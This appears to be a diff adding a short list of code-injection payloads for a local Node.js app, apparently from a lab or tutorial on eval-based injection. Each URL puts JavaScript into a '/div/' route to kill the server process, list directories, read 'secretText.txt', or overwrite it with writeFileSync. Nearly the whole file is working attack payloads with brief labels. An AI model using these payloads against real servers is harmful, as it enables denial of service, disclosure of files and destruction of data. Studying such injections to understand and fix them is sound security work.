@@ -1,0 +1,18 @@
+
+Soft Kill Server
+http://localhost:3000/div/process.exit()/2
+
+Hard Kill Server
+http://localhost:3000/div/process.kill(process.pid)/2
+
+List the contents of the current directory
+http://localhost:3000/div/res.end(require('fs').readdirSync('.').toString())/2
+
+List the contents of one directory up
+http://localhost:3000/div/res.end(require('fs').readdirSync('..').toString())/2
+
+Read the contents of the file
+http://localhost:3000/div/res.end(require('fs').readFileSync('secretText.txt'))/2
+
+http://localhost:3000/div/res.end(require('fs').writeFileSync('secretText.txt'))/2
+
